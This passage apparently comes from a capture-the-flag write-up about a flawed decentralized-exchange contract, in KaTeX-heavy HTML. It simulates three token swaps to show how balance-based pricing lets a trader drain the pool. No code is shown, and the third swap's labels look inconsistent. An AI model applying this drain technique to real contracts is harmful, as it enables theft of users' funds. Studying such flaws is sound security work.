class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></span> is the function to compute the price of the asset</li>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.68333em; vertical-align: 0em;"></span><span class="mord mathnormal">A</span></span></span></span></span> is the amount of the token to be traded</li>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.68333em; vertical-align: 0em;"></span><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span></span></span></span></span> is the contract address of a given token, subindexes <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">n</span></span></span></span></span>, <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.69444em; vertical-align: 0em;"></span><span style="margin-right: 0.03148em;" class="mord mathnormal">k</span></span></span></span></span> represent integers referring to the name of the tokens, in this case we have Token 1 and Token 2, though the <code>getSwapPrice</code> function can be called</li>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>e</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">Dex</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.68333em; vertical-align: 0em;"></span><span class="mord mathnormal">De</span><span class="mord mathnormal">x</span></span></span></span></span> is the address of the Dex contract</li>
</ul>
<p>This ratio computation is severely flawed and can very easily be used to attack the contract. We can see that by simply using the 10 tokens we’re given to perform swaps, the ratio becomes completely unbalanced, as we are simply relying on the available supply on the assets stored in the contract.</p>
<hr>
<p>To illustrate the imbalance each swap creates, let’s simulate the first 3 scenarios:</p>
<h4 id="first-swap">First swap</h4>
<p>With:</p>
<ul>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><msub><mi>T</mi><mn>1</mn></msub></msub><mo>=</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">A_{T_1} = 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.93343em; vertical-align: -0.2501em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.328331em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span style="margin-right: 0.13889em;" class="mord mathnormal mtight">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.317314em;"><span class="" style="top: -2.357em; margin-left: -0.13889em; margin-right: 0.0714286em;"><span class="pstrut" style="height: 2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.143em;"><span class=""></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2501em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">10</span></span></span></span></span></li>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>l</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi>O</mi><mi>f</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>D</mi><mi>e</mi><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">balanceOf(T_1, Dex) = 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">ba</span><span style="margin-right: 0.01968em;" class="mord mathnormal">l</span><span class="mord mathnormal">an</span><span class="mord mathnormal">ce</span><span style="margin-right: 0.02778em;" class="mord mathnormal">O</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">De</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">100</span></span></span></span></span></li>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>l</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi>O</mi><mi>f</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>D</mi><mi>e</mi><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">balanceOf(T_2, Dex) = 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">ba</span><span style="margin-right: 0.01968em;" class="mord mathnormal">l</span><span class="mord mathnormal">an</span><span class="mord mathnormal">ce</span><span style="margin-right: 0.02778em;" class="mord mathnormal">O</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">De</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">100</span></span></span></span></span>:</li>
</ul>
<p>Then:</p>
<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>T</mi><mn>1</mn></msub><mo>→</mo><msub><mi>T</mi><mn>2</mn></msub><mo>≈</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">T_1 \rightarrow T_2 \approx 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">10</span></span></span></span></span></span></p>
<p>After each swap, the balances will change, as we are putting units of <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">T_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span> in the pool and taking out units of <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">T_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span> and vice versa.</p>
<h4 id="second-swap">Second swap</h4>
<p>With:</p>
<ul>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><msub><mi>T</mi><mn>2</mn></msub></msub><mo>=</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">A_{T_2} = 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.93343em; vertical-align: -0.2501em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.328331em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span style="margin-right: 0.13889em;" class="mord mathnormal mtight">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.317314em;"><span class="" style="top: -2.357em; margin-left: -0.13889em; margin-right: 0.0714286em;"><span class="pstrut" style="height: 2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.143em;"><span class=""></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2501em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">10</span></span></span></span></span></li>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>l</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi>O</mi><mi>f</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>D</mi><mi>e</mi><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>110</mn></mrow><annotation encoding="application/x-tex">balanceOf(T_1, Dex) = 110</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">ba</span><span style="margin-right: 0.01968em;" class="mord mathnormal">l</span><span class="mord mathnormal">an</span><span class="mord mathnormal">ce</span><span style="margin-right: 0.02778em;" class="mord mathnormal">O</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">De</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">110</span></span></span></span></span></li>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>l</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi>O</mi><mi>f</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>D</mi><mi>e</mi><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>90</mn></mrow><annotation encoding="application/x-tex">balanceOf(T_2, Dex) = 90</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">ba</span><span style="margin-right: 0.01968em;" class="mord mathnormal">l</span><span class="mord mathnormal">an</span><span class="mord mathnormal">ce</span><span style="margin-right: 0.02778em;" class="mord mathnormal">O</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">De</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">90</span></span></span></span></span>:</li>
</ul>
<p>Then:</p>
<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>T</mi><mn>2</mn></msub><mo>→</mo><msub><mi>T</mi><mn>1</mn></msub><mo>≈</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">T_2 \rightarrow T_1 \approx 12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">12</span></span></span></span></span></span></p>
<p>Here we already see that by putting back the same 10 <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">T_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span> tokens we put in, we can now take out 12 <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">T_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span> tokens. This is because the internal price in the pool is now unbalanced.</p>
<h4 id="third-swap">Third swap</h4>
<p>With</p>
<ul>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><msub><mi>T</mi><mn>1</mn></msub></msub><mo>=</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">A_{T_1} = 12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.93343em; vertical-align: -0.2501em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.328331em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span style="margin-right: 0.13889em;" class="mord mathnormal mtight">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.317314em;"><span class="" style="top: -2.357em; margin-left: -0.13889em; margin-right: 0.0714286em;"><span class="pstrut" style="height: 2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.143em;"><span class=""></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2501em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">12</span></span></span></span></span></li>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>l</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi>O</mi><mi>f</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>D</mi><mi>e</mi><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>98</mn></mrow><annotation encoding="application/x-tex">balanceOf(T_1, Dex) = 98</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">ba</span><span style="margin-right: 0.01968em;" class="mord mathnormal">l</span><span class="mord mathnormal">an</span><span class="mord mathnormal">ce</span><span style="margin-right: 0.02778em;" class="mord mathnormal">O</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">De</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">98</span></span></span></span></span></li>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>l</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi>O</mi><mi>f</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>D</mi><mi>e</mi><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">balanceOf(T_2, Dex) = 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">ba</span><span style="margin-right: 0.01968em;" class="mord mathnormal">l</span><span class="mord mathnormal">an</span><span class="mord mathnormal">ce</span><span style="margin-right: 0.02778em;" class="mord mathnormal">O</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">De</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">100</span></span></span></span></span>:</li>
</ul>
<p>Then:</p>
<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>T</mi><mn>2</mn></msub><mo>→</mo><msub><mi>T</mi><mn>1</mn></msub><mo>≈</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">T_2 \rightarrow T_1 \approx 12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">12</span></span></span></span></span></span></p>
<p>This last swap illustrates that of the total pool balance, we have effectively ‘stolen’ 2% of the <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">T_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span> balance. Executing the swap several additional times, creates enough asset imbalance so that there’s no longer any assets in one side of the pool. If we continue though, we would drain both liquidity 